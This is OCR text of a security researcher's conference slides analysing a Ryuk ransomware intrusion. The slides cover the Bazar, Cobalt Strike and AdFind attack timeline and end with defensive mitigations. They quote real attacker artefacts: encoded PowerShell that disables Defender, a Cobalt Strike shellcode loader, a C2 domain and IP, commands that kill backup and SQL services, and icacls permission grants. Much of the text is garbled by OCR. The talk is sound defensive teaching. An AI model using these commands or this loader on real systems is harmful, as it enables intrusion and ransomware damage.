John Hammond

SECURITY RESEARCHER





A Brief History of Ransomware

Deep Dive into Ryuk Case Study

So What?

Demonstration

Defense & Endpoint Protection

Q/A





SP HUNTRESS





?
Ransomware: MSP Pays Hackers MSPs are the Latest Ransomware Target: Are You Safe?

$150,000 to Unlock Data
ny MSPs scramble to bolster security amid ransomware

Cus After a flurry of devastating ransomware attacks in 2019, MSPs and vendor partners
Ra are improving security to prevent history from repeating during the pandemic.

Rob Wright, News Director 23 Jun 2020

Early information suggests threat actors gained MSPs and offers advice on how to beef up security.
access to remote monitoring and management tools
from Webroot and Kaseya to distribute malware.

MSPs are being used to breach their |

GA Kevin williams on July 10, 2019




The Evolution of Ransomware

CryptoLocker WannaCry & Petya (B)) Maze & Ryuk
2013 2017 2020

AIDS Trojan Locky GandCrab i ™
ZA = ( & \
1989 2016 =s 2018 \ g }





Analyzing Ransomware

For every new incident or strain of malware we discover,
security researchers must analyze each stage of the
attack in order to understand its technical components
and determine how to defend against it.





SPHUNTRESS





Ryuk’s Return

UHS hospitals hit by reported country-wide Ryuk ransomware

attack

California MSP Suffers Ry uliepdebel bene
Ransomwere Attack
Ryk rarcaniware attack hits Date fies
Irigriged services proade: (haSe), bel
& Mf crasott Dyomics ERM aoctner In:

PMP setyrs.

RYUK Rénzomware Hits Ms
Cloud Service Provider

RYUK Rarcamivere atracks daudd serek

s oe *

ac5P rhe. works cosely wilh MSPs. |

*pappayed Pies pep rocavery pracess eslecritical risa
’ ‘

Cas cB,

areal a kl Recvery
i '

© 8 eter mrss tbe Abie YP HUNTRESS





Ryuk Timeline

UHS Case Study

3

Day

Bazar malware executed

J: minutes

Domain discovery commands

16:37

16:48

18 minutes

Registry discovery commands

17:06
22 minutes




Day One

oO More domain discovery
and network checks to
domain controllers

17:28 13 minutes
k Timeli
Ryu Time ine e@ AdFind used to map Active
Directory
UHS Case Study 17:41

~64 minutes operating





5.182.210.145 ~

Bazar Backdoor

-

_ CAUsers\user\Downloads\ _
Document-Preview.exe





Bazar Payload

s
~
~~
-

c:\Users\user\Downloads\

Document-Preview.exe





5.182.210.145 ~

— — a
= a,
~
~





Bazar Backdoor

_ C\Users\user\









Base64 encoded
PowerShell

SOBFAFGAIAAGAE4AZOB3ACOATWBIAGOAZOB{AHOAI
ABOAGUAdAAUAF CAZOBiAGMADABpAGUAbGBOACKALg
BEAGS AdwBuAGwAbwBhAGOAUWBOAHTAaQBuAGCAKAA
nAGgAdABOAHAAOgGAVACBAMOA yADCALGAWAC4AMAAU
ADEAOgA3ADGAMAAxACSAJwWApADSAIABTAGUAGAAtTA
EDACABOAH IAZOBmMAGUAcgBLAG4AYwBLACAALOBEAG
kAcwBhAGIAbAB1lAFIAZOBhAGWAGABpAGOAZOBNAGS
AbgBpAHQAbwByAGkAbgBnACAAJABOAH IAdOBLAA==

Set-MpPreference -DisableRealTimeMonitoring $true





ADFind
Active Directory tore |

Enumeration
ae





As seen in
“Command line Active Directory PRR a Rare le
query tool. Mixture of bn andl tricks
ldapsearch, search.vbs, Thousands of blog posts.
ldp,dsquery, and dsget tools | n--i\e—iniaennansanalaa mmm
with a ton of other cool features  ad_computers.te
thrown in for good measure.” Usage Be scant

Download and type adfind /? for basic usage __| subnets.txt
| ad_group.txt

See current usage screens |=) trustdmp.txt

https://www.joeware.net/freetools/tools/adfind/

18 © 2021 Huntress Labs. All rights reserved y HUNTRESS





Day Two

oO Checks again for domain trust
and AdFind using Bazar

18:49
23 minutes

eo o
Ryuk Timeline ° '
First lateralvtiov~ ne ae 2. pt

UHS Case Study with WMIC
20:12

1‘minutes

@ P64.exe Cobalt Strikes Saag yn
run on beac’ ieae he . .

+

oo qi inuses. gi





Ryuk Timeline

UHS Case Study

Day Two

Second P64.exe Cobalt Strike
beacon dropped on beachhead host

21:04 ;
5 minutes

Next lateral niovowien tin ta |
via a service aid Vwe 1. ah
21:09 —_—

Cobalt Strike beacon transferred via
SMB and run by service

SUCCESS

21:09





Ryuk Timeline

UHS Case Study

Day Two

Continual lateral movement activity
using Cobalt Strike beacons via
SMB across environment

21:10 - 22:06

Windows Defender begins to be
disabled using powershell commands

21:43

First Ryuk Ransomware executable
transferred to backup system

21:45

Ryuk Ransomware run enterprise wide

21:50 - 22:10





~205 minutes
Ransomweare in 3.5 hours





Ryuk Ransomware Deployed in 5
Hours using Zerologon

RANSOMWARE, flag — 5 hours

(SSL AWRENC
tS eae asl:

MOLOGY SERVICES

Ryuk Speed Run, 2 Hours to

Ransom

23 © 2021 Huntress Labs. All rights reserved YP HUNTRESS





18:49

© 2021 Huntress Labs. All rights reserved

Action: Kerberoasting

Target OU

SamAccountName
DistinguishedName

stingOu, DC=test Lab, DC=Local

OU=TestingoU, DC=test lab, DC=Local

testuser2

CN=testuser2,OU=Testing

YP HUNTRESS





First lateral movement attempt
with WMIC

20:12





Next lateral movement attempt
via a service and powershell

21:09

"Registry value set:

RuleName: -

EventType: SetValue

UtcTime: 80:88 :54.696

ProcessGuid; {1372738A-3659-5F6E-8A88-8006888GEF 80}

ProcessId: 468

Image: C:\Windows\system32\services.exe

TergetObject: HKLM\Systen\CurrentControlSet\Services\7ee3a9d\ImagePath

Detsils: %SSCOMSPEC%% /b /c start /b /min powershell -nop -w hidden -encodedcommand JA
AZWAOACTASAABARNASOBBAEEAQOBBAEEAQQSBAEE AQOBLADEAVWBIAF CAL WBpAESAQQBEACSAWABIADYARGBQ
QABAHTAdwBSADGAeCAAGADUACABSAG4AUABMAGE AbDwB6AEYADQB TAHUAMABSADIADOBVADEAUGASAHAANQBSAD
TADQAYQBZAF QAcABiAEGARABGAHKAYQBSAGY ARGBFAEMAVQBJADCANABOAFEANABPAEGAZwB jAHGARQBIAEIA
HUAVQBUAGSAQ9B2 AHEASQBIAGQANABWAHAANWBUAHT ANGBSAHCAUWBpAF QANGBNAHCAMABTACSANQBIAEUACA
AdgBPADEANQBt AGBARGArAECAZQBy AEEAUQB i AFMAawB 1 AHQAWGAXAEMAVWB1AEMATWBUAEWAL WABAFAACGBG
GBPADIAOQB1 AEEANQAr ADYAQwA1 AGSANWBmAFUAawA1 AFCAMQBXAFUABABSADY AB ABJAHQAL WEDAHY AdQAZAF
LAC SACQAGAFMAUWBQAFUADABOADCASQBiAFQADgB3AEUAagBtADcAT QB tADGAUQB j AGQAUABQAESAKwBGADEA
FOQAVWBEAEKAZQBxAF GAUQGPAGUAROBDAESA0AB1ACESAOABKAEGAZOB LAGBASQBMADCACQBxXAEQAagBWAECAdQ
ALWBLADIAZQGBVADGAVWEpAE BAUGB6 ADOAVGA2ADQARWEmAHUAC GB IAGOADWBIAFOAGABDADOANGBtAEEAQgAy.
ABGADYAZQBsAHEAcgByAGgAYWwASAGIAQQBRAF CAZABRAFAADWBNADUAS gBGAGwAawBVAGUAOQBUAESADWByAE
WAESARGBy AF YAYwBtADEAWQBpAHKANQAyAGwAT ABtAGgAdgBZAGwATABGAG4AZwB j AGWAQgA1AFOAQNBSAEEA
HAASGBpAGSASgBoAGwAWOBL ADAANQB6AF EAUQBSAFAASWBZAMOASWBKADCADAAWAHUANAA XADCAVABZAESAKW
ACGBGADEANQBpAHUARGBTACSAQWBSAF IADAAxXADUAegGBKAGS AdgBGAGs AUABHADY AMQBWAHE AegA2AEEATAAG
wWB6AHTAYwBiAEEANABQAGTAYQBY AFoAdGABpAEQAT gBYAECAKwBRAGBADQBhAECAZABiAESAcgBaAEBAVGBhAD
2AFEACGBhACSAdQBVADEAGABBAG4SAZABOAGCABAAZADY ASWASAGBASABpAD LAaQBmADY ADABQADY ADWELAHYA
HUAGABCAE SAdwBLADUACABSAG Y AUABZAGKADwB iADY AKwBUAGIANABGAFAAZQBJAFMAWAAVAGBAGQBYAFCAZA
AegBZAEUARGBNADY AagByADgAVOAr AFOAdQBNAGE AUABNAGY ACQBVAGI AYWBHAFOAKWAVAHY AQQBUADY AawB Tt
wB1 AHcAeABy AEUAUQBDAG4 AMnBy AGsAeQBTAHAAZABQADGAeQBHAFE AMQBLAFMADQAXAGIADAB1AGQADABOAH
KAE4ACAB4 AE TACABnAEMASGBGAF QAcgBSADAAZQBHAHUACGBSADMAT wA2AFAARABGAFQAagBGAHQAY gBBADUA
FQANQBUADCAMQBJAE SAWABBAG [AdwBKADAACwB JAHIAZOB4ADQAagBxXAHY ADQASADAANABXAGCARGBTAGMATQ
AVWBWAFQAWOBGAE EAGQBGAGCAdgBVAC8ATABSAGK AWGBGADGAT gBTAFOAYWBBAEKAMWA TAGSATABXAGCAYQAT
Bj AEOALWBoAE TAVOBSAF QANGBDAEWADQBUAHAAQwBZ AHKAOQBSAGMAV AB 1 AECANQBHAGQAKwEmACSAaQBFAD
SAEYASABxXAGKATQBOADAAY BV AGMASWB3 ADK AB AB j AFGADQBUACSAegBrAHcAcwBBAEEAQQASADGAIGApACKA
GBAbDgAUAE cAegBpAHAAUWBOAHIAZQBhAGBAKAAKAHMAL ABDAEKAT wAUAEMADwB tAHAAcgB LAHMACwBpAGSAbQ





Het-StrictMode -Version 2

$DoIt = a’
function func_get_proc_address {
Param ($var_module, $var_procedure)
$¢var_unsafe_native_methods = ([AppDomain] ::CurrentDomain.GetAssemblies() | where-Object { $_.GlobalAssemblyCache -And $_.Location.Split("\\')[-1].Equals("System.dl1") }).Ge
$var_gpa = $var_unsafe_native_methods.GetMethod( 'GetProcAddress', [Type[]] @( "System.Runtime.InteropServices.HandleRef', ‘string"))
return $var_gpa.Invoke($null, a([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_meth
module)))), $var_procedure))

function func_get_delegate_type {
Param (
[Parameter(Position - 6, Mandatory - $True)} [Typel]] $var_parameters,
[Parameter(Position - 1)]} [Type] $var_return_type - [Void]
)

$var_type_builder = [AppDomain] :: CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName( 'ReflectedDelegate")), [System.Reflection. Emit .AssemblyBuilc
false).Definelype( 'MyDelegateType', “Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

$var_type_builder.DefineConstructor( 'RISpecialName, HideBySig, Public’, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetimplementationFlags( "Runtime,

$var_type_builder.DefineMethod( Invoke’, "Public, HideBySig, NewSlot, Virtual", $var_return_type, $var_parameters).SetImplementationFlags( ‘Runtime, Managed’)

return $var_type_builder.CreateType( )

}

[Byte[}]¢var_code - [System.Convert] :: FromBase64String( * 38uqIyMjQ6rGEvFHqHETQHEVqHE3QF ELL IRPBRLCEUOPHO IF IQSDSuwul uTBO3 FOQHEZQGEFIVOoY 1umé 1dpIvN2qGs7qHsDI vDAH2qoF6gi9RLCEuOPSuwulugt
Cw3t8eagxyKV+EUuNIYOs jMyMjS92c ICNITOt7h3DG3PZzyos j TyNSEupycks jkycjSyOT JyNITKKLSSBxS2ZT/PFCINOONWd IT 3FLCOxewd22puNXTUK JSSNITG6r FaOUNnGsGe4suoxwe vSSN1SSdxdEuOvxyY3PaodweZSSN1SyMDIyNxdEu
ZOS+Wi pHHC9ggnBbhvBysa4l ckS9OWesxXXc9txXHBZ2PLCN2c3H9/DX9OTSLNGFIFTQHwaQeJATyM)IyM-=' )

for ($x = @; $x -Lt $var_code.Count; $x++) {
$var_code[$x] - $var_code[$x] -bxor 35
}

$var_va - [System.Runtime.InteropServices.Marshal] :: GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [
$var_buffer - $var_va.Invoke([IntPtr]::Zero, $var_code.Length, @«3000, 0x46)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal] ::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate type a(f[intPtr]) ([void])))
$var_runme. Invoke([intPtr] :: Zero)
‘a

If ([IntPtr]::size -eq a) {
start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job

else {

TEX $DoIt https://thedfirreport.com/2020/10/08/ryuks-return/





$doIt = a’
function func_get_proc_address {
Param ($var_module, $var_procedure)
$var_unsafe_native_methods = ([AppDomain] :: CurrentDomain.GetAssemblies() | where
$var_gpa = $var_unsafe_native_methods.GetMethod( 'GetProcAddress', [Type[]] a( "Sy
return $var_gpa.Invoke($null, a([System.Runtime.InteropServices .HandLeRef ](New-0!
module)))), $var_procedure))

function func_get_delegate_type {
Param (
[Parameter(Position - 6, Mandatory - $True)} [Typel]] $var_parameters,
[Parameter(Position - 1)] [Type] $var_return_type - [Void]

$var_type_builder = [AppDomain] :: CurrentDomain.DefineDynamicAssembly({(New-Object
false).OefineType( 'MyDelegateType', “Class, Public, Sealed, AnsiClass, AutoClass', [Syst:

$var_type_builder.DefineConstructor( 'RISpecialName, HideBySig, Public’, [System.

$var_type_builder.DefineMethod({ Invoke’, “Public, HideBySig, NewSlot, Virtual’,

return $var_type_builder.CreateType( )

PowerShell Reflection
technique to find
addresses of Win32 API
functions and call them




[Byte[}]$var_code + [System.Convert] :: FromBase64String( ' 38uqlyMjQ6rGEvFHqHETQHEVqHE3qQF ELL JRpBRL¢CEUOPHO If IQ8DSuwul uTBO3 FOQHEZQGEF IvOoY 1ums 1dpIvNzqGs 7qHsDIvDAH2qoF6gi9RLCEuOPSumulugt
Cw3t8eagxyKV+EUNIYOs jMyMjS92C ICNITOt7h3DG3PZzyos jIyNSEupycks jkycjSyOT JyNITKKLSSBxS2ZT/PFCINOONWd IT3FLCOxewd22puNXTUKjSSNITG6r FoOUngsGe4SuoxwevSSN1SSdxdEuOvXxyY3PaodwezSSW1SyMDIyNxdEu
ZOS+Wi pHHC9ggnBbhvBysa4l ckS9OWEXXC9t XHBZPLCN2C3H9/DXOTSLNGFI1FTQHwaQB JATyMjIyM~" )

Base64 encoded and XOR‘d shelicode

https://thedfirreport.com/2020/10/08/ryuks-return/





XOR-ing the shellcode to “decrypt it”

for ($x = @; $x -1t $var_code.Count; $x++) {
. $var_code[$x] - $var_code[$x]} -bxor 35

https://thedfirreport.com/2020/10/08/ryuks-return/





Allocating memory for the shellicode,
copying it in, and invoking it

$var_va - [System.Runtime. InteropServices.Marshal] ::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [
$var_buffer - $var_va.Invoke([IntPtr]::Zero, $var_code.Length, @«3000, @x4@)
[System.Runtime. InteropServices.Marshal] ::Copy($var_code, ®, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal] ::GetOelegateForFunctionPointer($var_buffer, (func_get_delegate_type a@([intPtr]) ([void])))

$var_runme. Invoke( [IntPtr] :: Zero)
‘a

https://thedfirreport.com/2020/10/08/ryuks-return/





Executing all of the above code

If ([IntPtr]::size -eq a) {
start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job

else {

IEX $DoIt https://thedfirreport.com/2020/10/08/ryuks-return/

}





C2 established:

martahzz.com: 443

t date.win.system.level 4

t data.win.system.message "File created:
RuleName: -
UtcTime: 06 :69:29.597
ProcessGuid: {1372738A-3655-5F6E-8106-988800006F8
8}
ProcessId: 4
Image: System
TargetFilename: C:\Windows \bGe7f5f .exe
CreationUtcTime: 66 :69:29.597"

@ Cobalt Strike beacon transferred via
SMB and run by service :
y eventdata. image C:\\Windows\\System32\\services.exe

21:09

eventdata. imageLoaded \WW .\ADMINS\ \bGe7f5f .exe





First Ryuk Ransomware executable
transferred to backup system

21:45

Ryuk Ransomware run enterprise wide

21:50 - 22:10





"C:\Windows\system32\net1 stop \""samss\"" /y"
"C:\Windows\system32\net1 stop \""veeamcatalogsvc\"" /y"
"C:\Windows\system32\net1 stop \""veeamcloudsvc\"" /y"

"C:\Windows\system32\net1 stop \""veeamdeploysvc\"" /y"
"C:\Windows\System32\net.exe\"" stop
"C: \Windows\System32\net.exe\"" stop
"C:\Windows\System32\net.exe\"" stop
"C:\Windows\System32\net.exe\"" stop

"C: \Windows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C: \Windows\System32\taskkill.
"C: \WWindows\System32\taskkill.
"C: \Windows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C:\Windows\System32\taskkill.
"Cc: \Windows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C: \WWindows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C: \WWindows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C:\Windows\System32\taskkill.
"C:\Windows\System32\taskkill.

exe\""
exe\ nu
exe\" u"
exe\""
exe\ nu
exe\" "
exe\" "
exe\""
exe\" "
exe\""
exe\""
exe\ nu
exe\" u
exe\" "
exe\ nu
exe\" u"
exe\" "
exe\""
exe\ nu

ye "samss\" i /y"
\""veeamcatalogsvc\"" /y"
\""veeamcloudsvc\"" /y"
\""veeamdeploysvc\"" /y"
sqlbrowser.exe /F"
sqlceip.exe /F"
sqlservr.exe /F"
sqlwriter.exe /F"

/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM
/IM

"C:\Windows\system32\taskmgr.exe\"" /4"
"C:\Windows\system32\wbhem\wmiprvse.exe -Embedding"
"C:\Windows\system32\wbhem\wmiprvse.exe -secured -Embedding"
"icacls \""C:\*\"" /grant Everyone:F /T /C /Q"
"icacls \""D:\*\"" /grant Everyone:F /T /C /Q"

veeam.
veeam.

veeam
veeam
veeam
veeam
veeam
veeam

veeam.
veeam.

backup.
backup.
.- backup.
- backup.
. backup.
- backup.
- backup.
- backup.
backup.

backup

agent .configurationservice.exe /F"
brokerservice.exe /F"
catalogdataservice.exe /F"
cloudservice.exe /F"
externalinfrastructure.dbprovider.exe /F"
manager.exe /F"

mountservice.exe /F"

service.exe /F"

uiserver.exe /F"

-wmiserver.exe /F"

veeamdeploymentsvc.exe /F"
veeamfilesysvsssvc.exe /F"
veeam.guest.interaction.proxy.exe /F"
veeamnfssvc.exe /F"
veeamtransportsvc.exe /F"





"C:\Windows\system32\net1 stop \""samss\"" /y"

"C:\Windows\system32\net1 stop \""veeamcatalogsvc\"" /y"
"C:\Windows\system32\net1 stop \""veeamcloudsvc\"" /y"

"C:\Windows\system32\net1 stop \""veeamdeploysvc\"" /y"
"C:\Windows\System32\net.exe\"" stop \""samss\"" /y"
"C:\Windows\System32\net.exe\"" stop \""veeamcatalogsvc\"" /y"
"C:\Windows\System32\net.exe\"" stop \""veeamcloudsvc\"" /y"
"C:\Windows\System32\net.exe\"" stop \""veeamdeploysvc\"" /y"
"C:\Windows\System32\taskkill.exe\"" /IM sqlbrowser.exe /F"

"C: \Windows\System32\taskkill.exe\"" /IM sqlceip.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM sqlservr.exe /F"

"C: \Windows\System32\taskkill.exe\"" /IM sqlwriter.exe /F"

"C: \Windows\System32\taskkill.exe\"" /IM veeam.backup.agent.configurationservice.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.brokerservice.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.catalogdataservice.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.cloudservice.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.externalinfrastructure.dbprovider.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.manager.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.mountservice.exe /F"

"C: \Windows\System32\taskkill.exe\"" /IM veeam.backup.service.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.uiserver.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.wmiserver.exe /F"

"C: \Windows\System32\taskkill.exe\"" /IM veeamdeploymentsvc.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeamfilesysvsssvc.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeam.guest.interaction.proxy.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeamnfssvc.exe /F"
"C:\Windows\System32\taskkill.exe\"" /IM veeamtransportsvc.exe /F"





"icacls \""C:\*\"" /grant Everyone:F /T /C /Q"
"icacls \""D:\*\"" /grant Everyone:F /T /C /Q"





SP HUNTRESS





Hackers still FLOSS

We saw a chain of free and open-source software.

e ADFind

https://www.joeware.net/freetools/tools/adfind/

e PowerView
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

e Rubeus
https://github.com/GhostPack/Rubeus

https://www.gnu.org/philosophy/floss-and-foss.en.html





Hackers still LOL

We saw a chain of living-off-the-land binaries and scripts.

e nitest
https://attack.mitre.org/software/S0359/

e WMIC
https://attack.mitre.org/techniques/T 1047/

e rundil32
https://attack.mitre.org/techniques/T1218/011/

https:/Nolbas-project.github.io/





What about Emotet & Trickbot?

If we boil it down, the concepts are still the same.
e Initial access, lateral movement, command and control...
e Still demands manual analysis

e “It takes a village”





SP HUNTRESS





SPHUNTRESS





Automation with Manual Analysis

oN

e Trained analysts examine e You are notified of danger. e
suspicious behavior.

e Less false positives, ®

e Manual human analysis less false negatives.
understands context.

You make the informed
decision to respond.

Remediation is thorough
and stops the problem
at the source.





How can we === mitigate this attack?

The software safeguards:

Disable CMD

PowerShell ConstrainedLanguageMode
Application Whitelisting with AppLocker
LAPS

Harden GPOs/ACLs

Credential Guard

Protected Users Security Group





Cybersecurity is not a technology problem

It is a people problem





How can we === mitigate this attack?

The boring, boilerplate and trite “best practices”:

2FA/MFA

Complex passwords
Password policy
User education
Patch & update
Egress monitoring
DNS filtering




How can we === mitigate this attack?

The boring, boilerplate and trite “best practices”:

2FA/MFA
Complex passwords User education. User education. User education.

Password policy . | 7 7
: ion Sure, this feels like a “bad” answer.

Patch & update
Egress monitoring
DNS filtering





SP HUNTRESS





John Hammond

SECURITY RESEARCHER

+1 (833) HUNT-NOW
john.hammond@huntresslabs.com





Start your free 21-day trial today
&: Deploy in minutes to an unlimited
number of endpoints

Remediate persistent footholds
and other identified threats Ld
HUNTRESS

ja Receive custom incident reports huntress.com/trial

From our ThreatOps team





@ HUNTRESS